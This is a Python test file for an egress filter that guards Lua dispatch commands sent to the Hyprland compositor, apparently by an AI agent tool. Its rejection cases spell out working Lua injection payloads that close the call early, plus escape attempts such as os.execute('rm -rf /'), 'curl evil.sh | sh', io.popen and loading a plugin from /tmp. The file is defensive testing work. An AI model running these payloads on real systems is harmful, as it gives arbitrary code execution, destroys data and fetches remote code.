"""Tests for the egress filter.

The negative cases here are not hypothetical. Three of them are the
exact payloads that were demonstrated during the planning research to
execute arbitrary Lua inside the Hyprland compositor on this machine,
with `os.execute` in scope. They exist as tests so that if anyone ever
"simplifies" the filter, the failure is a red test rather than a
compositor-level code-execution hole.

The dispatcher-name cases are the other half. `hl.dsp.exec({cmd="x"})`
is a perfectly well-formed payload by shape, and `exec` runs through
`sh -c`; the filter used to let it through. The name is now pinned to
what Elizabeth's tools generate, so these pin that pin.
"""

from __future__ import annotations

import pytest

from elizabeth.tools.egress import ALLOWED_DISPATCHERS, EgressRejected, check


class TestAcceptsLegitimatePayloads:
    """The value grammar. Every case uses `focus` because it is the only
    dispatcher the tools build — these test the argument shapes, not the
    semantics of a particular key on a particular dispatcher.
    """

    def test_focus_workspace_by_number(self) -> None:
        assert check("hl.dsp.focus({workspace=2})")

    def test_focus_window_by_address(self) -> None:
        assert check('hl.dsp.focus({window="address:0x55d1a2b3c4"})')

    def test_multiple_keys(self) -> None:
        assert check('hl.dsp.focus({workspace=1, window="address:0xabc"})')

    def test_boolean_value(self) -> None:
        assert check("hl.dsp.focus({floating=true})")

    def test_empty_table(self) -> None:
        assert check("hl.dsp.focus({})")


class TestRejectsUnlistedDispatchers:
    """A well-formed payload naming a dispatcher the tools never build.

    The shape grammar cannot tell `killactive({})` from `focus({})`, and
    the substring denylist only knows the routes someone thought of. So
    the name itself is checked against ALLOWED_DISPATCHERS, and a RED
    action that arrives looking legitimate is still refused.
    """

    def test_allowlist_is_exactly_what_the_tools_generate(self) -> None:
        # Growing this set is a code change with a test, not a setting.
        # If a new tool legitimately needs another dispatcher, add it
        # here AND in TestGeneratedPayloadsSurviveEgress (test_hyprland).
        assert ALLOWED_DISPATCHERS == frozenset({"focus"})

    @pytest.mark.parametrize(
        ("payload", "route"),
        [
            ('hl.dsp.exec({cmd="poweroff"})', "exec"),
            ('hl.dsp.exec({a="systemctl poweroff"})', "exec"),
            ('hl.dsp.exec({a="sh -c curl"})', "exec"),
            ('hl.dsp.spawn({cmd="xterm"})', "spawn"),
            ("hl.dsp.exit({})", "exit"),
        ],
    )
    def test_shell_and_session_dispatchers_are_named_in_the_rejection(
        self, payload: str, route: str
    ) -> None:
        # These three are the most direct route from a dispatch to a
        # shell (or to a dead session). They are on the denylist as well
        # as off the allowlist, so the error names the route.
        with pytest.raises(EgressRejected, match=route):
            check(payload)

    @pytest.mark.parametrize(
        "payload",
        [
            "hl.dsp.killactive({})",  # RED in tiers.py; used to be accepted
            "hl.dsp.forcekillactive({})",
            "hl.dsp.window.move({workspace=3})",  # nested names are not a bypass
            "hl.dsp.fullscreen({enable=true})",
            "hl.dsp.focus_({workspace=1})",  # a near-miss is still a miss
            "hl.dsp.Focus({workspace=1})",  # Lua is case-sensitive; so is this
        ],
    )
    def test_well_formed_but_unlisted_is_rejected_by_name(self, payload: str) -> None:
        # Nothing here is on the denylist, so only the allowlist can be
        # what refuses it — `match` pins that it was.
        with pytest.raises(EgressRejected, match="dispatcher"):
            check(payload)


class TestProvenInjectionPayloads:
    """The three shapes demonstrated to actually execute on this machine.

    Each closes the dispatch call early and opens a new Lua expression —
    the technique works because `hyprctl dispatch X` compiles X as Lua
    rather than treating it as data.
    """

    def test_anonymous_function_injection(self) -> None:
        payload = "hl.dsp.no_op()) or (function() return hl.dsp.no_op() end)("
        with pytest.raises(EgressRejected):
            check(payload)

    def test_global_call_injection(self) -> None:
        payload = "hl.dsp.no_op()) and (ELIZABETH_MARKER() and hl.dsp.no_op("
        with pytest.raises(EgressRejected):
            check(payload)

    def test_os_execute_reachability_probe(self) -> None:
        payload = 'hl.dsp.no_op()) and (type(os.execute)=="function" and hl.dsp.no_op('
        with pytest.raises(EgressRejected, match="os\\."):
            check(payload)


class TestRejectsLuaEscapeHatches:
    @pytest.mark.parametrize(
        "payload",
        [
            'hl.dsp.focus({window="x"}); os.execute("rm -rf /")',
            'hl.dsp.exec_cmd("curl evil.sh | sh")',
            'hl.dsp.focus({window=io.popen("whoami"):read()})',
            'hl.dsp.focus({window=load("return 1")()})',
            'hl.dsp.focus({window=dofile("/tmp/x.lua")})',
            'hl.dsp.focus({window=require("os").time()})',
            "hl.dsp.focus({window=debug.getinfo(1)})",
            "hl.dsp.focus({window=getmetatable({})})",
        ],
    )
    def test_rejected(self, payload: str) -> None:
        with pytest.raises(EgressRejected):
            check(payload)

    def test_case_does_not_evade(self) -> None:
        with pytest.raises(EgressRejected):
            check('hl.dsp.focus({window=OS.execute("x")})')

    def test_hyprctl_eval_is_rejected(self) -> None:
        with pytest.raises(EgressRejected, match="eval"):
            check("hl.dsp.eval({code=1})")

    def test_plugin_load_is_rejected(self) -> None:
        with pytest.raises(EgressRejected, match="plugin"):
            check('hl.dsp.plugin({path="/tmp/evil.so"})')


class TestRejectsMalformedShapes:
    def test_empty(self) -> None:
        with pytest.raises(EgressRejected, match="empty"):
            check("")

    def test_whitespace_only(self) -> None:
        with pytest.raises(EgressRejected, match="empty"):
            check("   ")

    def test_bare_command_not_in_dispatch_form(self) -> None:
        with pytest.raises(EgressRejected):
            check("workspace 2")

    def test_old_hyprlang_syntax_is_rejected(self) -> None:
        # The pre-0.55 form. Every tutorial online still emits this, so a
        # model or an agent will produce it eventually — better a loud
        # rejection than a confusing Lua parse error from the compositor.
        with pytest.raises(EgressRejected):
            check("dispatch workspace 2")

    def test_unquoted_string_value_is_rejected(self) -> None:
        # An unquoted bareword is a Lua identifier lookup, not a string —
        # exactly the gap an injection widens.
        with pytest.raises(EgressRejected):
            check("hl.dsp.focus({window=somevariable})")

    def test_string_with_quotes_inside_is_rejected(self) -> None:
        with pytest.raises(EgressRejected):
            check('hl.dsp.focus({window="a"..b.."c"})')

    def test_semicolon_chaining_is_rejected(self) -> None:
        with pytest.raises(EgressRejected):
            check("hl.dsp.focus({workspace=1}); hl.dsp.focus({workspace=2})")

    def test_trailing_content_is_rejected(self) -> None:
        with pytest.raises(EgressRejected):
            check("hl.dsp.focus({workspace=1}) print(1)")


class TestFilterNeverSanitises:
    def test_valid_payload_returns_unchanged(self) -> None:
        payload = "hl.dsp.focus({workspace=4})"
        assert check(payload) == payload

    def test_rejection_raises_rather_than_cleaning(self) -> None:
        # Quietly stripping the bad part would hide the upstream bug that
        # produced it — which is the whole point of this being a backstop
        # rather than a sanitiser.
        with pytest.raises(EgressRejected):
            check('hl.dsp.focus({workspace=1}) os.execute("x")')
